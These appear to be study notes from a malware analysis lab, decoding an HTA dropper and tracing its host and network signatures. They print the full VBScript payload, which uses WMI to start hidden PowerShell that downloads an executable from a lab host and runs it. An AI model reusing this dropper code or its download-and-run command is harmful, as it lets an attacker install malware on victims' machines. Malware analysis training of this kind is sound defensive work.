
## What is HTA
**HTML Application (HTA)** is a Windows file can execute HTML CSS and JavaScript on windows OUTSIDE of the browser.

## Analyzing HTAs
Malware example: `PMAT-labs/labs/3-3.OffScript-ScriptMalware/HTA/Dropper.hta.7z` 

The file contains a URL encoded payload that use the:
- `document.write()`: The `write()` method writes directly to an open (HTML) document stream.
- `unescape():` The `unescape()` function computes a new string in which hexadecimal escape sequences are replaced with the characters that they represent.

![[Pasted image 20250201000424.png]]

Now take the hex and pass on cyber chef with `form hex` rule and percent delimiter.
![[Pasted image 20250201000927.png]]

this is the payload code

```html
<html>
<head>
<title> >_ </title>
<center><h1>404 Not Found</h1></center>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://tailofawhale.local/TellAndSentFor.exe','%temp%\jLoader.exe');Start-Process '%temp%\jLoader.exe'", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>
```


## Invoking WMI & Executing PowerShell

This is the VB script executed by the HTML payload
```bash
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://tailofawhale.local/TellAndSentFor.exe','%temp%\jLoader.exe');Start-Process '%temp%\jLoader.exe'", null, objConfig, intProcessID)
	window.close()
end sub
```

- `Locator.ConnectServer()`: Its used to connect the code of `WMI` windows service
- `Service.Security_.ImpersonationLevel=impersonation`: Its used to impersonate the user that launch the program
- `Service.Get("Win32_Process")`: Create `WMI` object use to manage process.
- `Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://tailofawhale.local/TellAndSentFor.exe','%temp%\jLoader.exe');Start-Process '%temp%\jLoader.exe'`: Create cmd shell that execute the powrshell command that download file from  `http://tailofawhale.local/TellAndSentFor.exe` and executed that.



## Dynamic Analysis
![[Pasted image 20250201195412.png]]
### Host signature
After execution we can find the malware under `%TEMP%` path.
![[Pasted image 20250201195900.png]]
### Network signature
Using wireshark we can see the malware try to contact the flowing domain 
`tailofawhale.local`
and the `http://tailofawhale.local/TellAndSentFor.exe` URI to install the malware.
![[Pasted image 20250201195513.png]]

### WMI process
There is a instance of `svchost.exe` under  the `winint.exe`. In the `svhost.exe` we can fin the `winprvse.exe`. This is the way that Windows invokes `VMI` to execute process. Infect under the `winprvse.exe` we can find the `powershell` process and the `jLoader.exe` malware.
![[Pasted image 20250201200359.png]]
